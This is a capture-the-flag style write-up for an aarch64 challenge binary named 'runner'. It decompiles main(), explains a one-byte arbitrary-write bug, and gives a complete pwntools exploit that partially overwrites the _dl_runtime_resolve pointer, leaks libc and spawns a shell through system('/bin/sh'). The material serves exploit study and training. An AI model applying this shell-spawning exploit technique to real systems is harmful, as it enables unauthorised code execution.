# main() function analysis

```c
0 void main(void) {
1   code *UNRECOVERED_JUMPTABLE;
2   char *pcVar1;
3   long exit;
4   char buf [16384];
5   char *addr;
6   uint exit_status;
7   char *byte;
8   int proc_self_maps;
9   char *data_;
10
11   if (0 < bad_pwner_returning_to_main) {
12        /* WARNING: Treating indirect jump as call */
13     UNRECOVERED_JUMPTABLE = (code *)UndefinedInstructionException(0,0x110ac0);
14     (*UNRECOVERED_JUMPTABLE)();
15     return;
16   }
17   bad_pwner_returning_to_main = bad_pwner_returning_to_main + 1;
18   setbuf(_stdout,(char *)0x0);
19   setbuf(_stdin,(char *)0x0);
20   proc_self_maps = open("/proc/self/maps",0);
21   read(proc_self_maps,buf,0x4000);
22   data_ = buf;
23   while( true ) {
24     byte = strchr(data_,10);
25     if (byte == (char *)0x0) break;
26     *byte = '\0';
27     pcVar1 = strstr(data_,"run");
28     if (pcVar1 != (char *)0x0) {
29       puts(data_);
30     }
31     data_ = byte + 1;
32   }
33   puts("exit status >");
34   read(0,buf,16384);
35   exit = strtol(buf,(char **)0x0,0x10);
36   exit_status = (uint)exit;
37   puts("address >");
38   read(0,buf,16384);
39   addr = (char *)strtol(buf,(char **)0x0,0x10);
40   puts("character >");
41   read(0,buf,16384);
42   *addr = buf[0];
43   printf("exiting with status: %d\n",(ulong)exit_status);
44       /* WARNING: Subroutine does not return */
45   ::exit(exit_status);
46 }
```

```c
40   puts("character >");
41   read(0,buf,16384);
42   *addr = buf[0];
```
- in this snippet we see that we can write any address and overwrite whatever pointer its holding, but only one character.

---

- By searching for the offset of the start of the `.got.plt` section of the binary in ghidra and adding that to the base address of the binary we can view the .got.plt section in the binary with GDB

- the 3rd qword is where the `dl_runtime_resolve` function is.

![](https://i.imgur.com/9U3oJDF.png)
- We will utilize the fact that we can write to the LSB of an arbitrary address we chose `dl_runtime_resolve`; Bypassing the part where it stores its registers and adjusting the stack causing it to restore its registers with data that partially overlaps our buffer instead.

- The technique employed is only **_possibly_** due to the architecure being ARM, the register stashing would be completely different on other architectures.

---

# Exploit Code:
```python
from pwn import *  
  
  
elf = context.binary = ELF('./runner_patched')  
libc = elf.libc  
context(os="linux", arch="aarch64")  
context.log_level = "debug"  
  
gs = ""  
  
def start():  
   if args.GDB:  
       return gdb.debug(elf.path, gdbscript=gs, api=True)  
   elif args.REMOTE:  
       return remote(host, port)  
   else:  
       return process(["qemu-aarch64", "-L", ".", elf.path])  
  
io = start()  
  
def rebase() -> int:  
   base_addr = int(io.recvline().split(b"-")[0], 16)  
   return base_addr  
  
base = rebase()  
log.info(f"bin base @ {base:#x}")  
elf.address = base  
  
  
linker_func_resolver = elf.got.exit - 8  # address of the ptr that points to _dl_runtime_resolve  
jump_byte = p8(0xac)                     # overwrite LSB with 0xac to skip register stashing  
  
  
def send_payload(address: int, payload: bytes, exit_status=False):  
   if exit_status != False:  
       io.sendlineafter(b"exit status >\n", f"{exit_status}".encode())  
   io.sendlineafter(b"address >\n", f"{address:08x}".encode())  
   io.sendlineafter(b"character >\n", payload)  
  
padd = b"\x00" * 0x88  
payload_one = jump_byte + b"pwnpope"       # our LSB overwrite padded with 7 more bytes that don't matter, just for allignment. (ends up in x3)  
payload_one += p64(elf.got.puts)           # got address puts. (ends up in x0)  
payload_one += padd                        # padd out buffer to skip over: x4-x9 and sp  
payload_one += p64(elf.got.printf)         # got address of printf (ends up in x17)  
payload_one += p64(elf.address + 0x10bcc)  # return address for printf, back to main() skipping over the main return check. (ends up in x30)  
  
send_payload(exit_status=0x1337, address=linker_func_resolver, payload=payload_one)  # first payload:  
# info: this payload is meant to leak the address of puts so we can rebase libc  
# more: we will overwrite the LSB of the _dl_runtime_resolve function with 0xac, effectively  
# skipping the register stashing and using our user controlled buffer for inputs to certain registers.  
  
puts_leak = int.from_bytes(io.recvuntil(b"address").replace(b"address", b""), "little")  
libc.address = puts_leak - libc.sym.puts  
log.info(f"libc base @ {libc.address:08x}")  
  
  
bin_sh = next(libc.search(b"/bin/sh\0"))  
print(f"{bin_sh:#x}")  
payload_two = jump_byte + b"pwnpope"  
payload_two += p64(bin_sh)  # x0  
payload_two += p64(bin_sh)  # x1  
payload_two += padd[:-8]    # padd out buffer skipping x4-x9 and sp  
payload_two += p64(elf.got.strstr)  # x17  
payload_two += p64(libc.sym.system) # x30  
# payload_two:    
# we're going back to the _dl_runtime_resolve function one more time in order to achieve a shell  
# A: put ptr to string /bin/sh\0 into x0 & x1 as args for strstr()  
# B: padd the buffer to reach x17 and x30 to call strstr and then use the result of strstr to pass as an argument to the return address which is system  
  
io.sendlineafter(b">\n", f"{linker_func_resolver:08x}".encode())  
io.sendlineafter(b">\n", payload_two)
```